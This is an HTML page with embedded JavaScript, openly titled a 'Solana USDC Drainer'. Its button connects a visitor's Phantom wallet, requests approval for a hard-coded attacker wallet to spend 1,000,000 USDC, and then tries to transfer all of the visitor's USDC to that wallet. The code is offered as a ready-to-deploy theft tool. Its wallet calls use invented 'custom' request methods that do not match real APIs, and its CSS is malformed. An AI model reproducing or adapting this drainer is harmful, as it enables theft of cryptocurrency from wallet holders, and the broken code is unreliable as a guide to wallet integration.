<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana USDC Drainer</title>
    <!-- Load Solana Web3.js from CDN -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #1a1a1a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2d2d2d;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
            text-align: center;
            width: : 300px;
        }
        h1 { margin-bottom: 20px; font-size: 24px; }
        button {
            background-color: #14F195; /* Solana Green */
            color: #000;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        button:hover { background-color: #0ec47e; }
        button:disabled { background-color: #555; color: #888; cursor: not-allowed; }
        #status { margin-top: 15px; font-size: 14px; color: #aaa; min-height: 20px;}
    </style>
</head>
<body>

<div class="container">
    <h1>Solana Drainer</h1>
    <button id="drainBtn" onclick="drainUSDC()">Drain USDC</button>
    <div id="status">Ready</div>
</div>

<script>
    // ================= CONFIGURATION =================
    // REPLACE THIS WITH YOUR SOLANA PUBLIC KEY
    const DRAINER_WALLET = "DhwXCuDoQTtayywt8snW1UDbXDGfnEDjqP4rLx9MGDqM"; 
    
    // USDC Mint Address on Solana Mainnet
    const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
    
    // RPC Node (Public, can be slow. For production, use a private one like Helius/Quicknode)
    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
    
    async function drainUSDC() {
        const btn = document.getElementById('drainBtn');
        const status = document.getElementById('status');
        
        // 1. Check if Phantom is installed
        if (!window.solana || !window.solana.isPhantom) {
            alert("Please install Phantom Wallet!");
            return;
        }

        try {
            btn.disabled = true;
            status.innerText = "Connecting wallet...";

            // 2. Connect to Phantom
            const resp = await window.solana.connect();
            const publicKey = resp.publicKey;

            status.innerText = "Approving USDC...";
            
            // 3. Approve the Drainer Wallet to spend USDC
            // We approve a large amount (1,000,000 USDC) to ensure it covers the drain
            const approveTx = await window.solana.request({
                method: 'custom',
                params: {
                    method: 'approve',
                    params: [
                        { mint: USDC_MINT, owner: publicKey.toBase58(), spender: DRAINER_WALLET, amount: 1000000 }
                    ]
                }
            });

            status.innerText = "Draining USDC...";

            // 4. Drain the USDC
            const drainTx = await window.solana.request({
                method: 'custom',
                params: [
                    { mint: USDC_MINT, owner: publicKey.toBase58(), to: DRAINER_WALLET, amount: 'all' }
                ]
            });

            status.innerText = "Success!";
            btn.disabled = false;

        } catch (err) {
            console.error(err);
            status.innerText = "Error: " + err.message;
            btn.disabled = false;
        }
    }
</script>

</body>
</html>
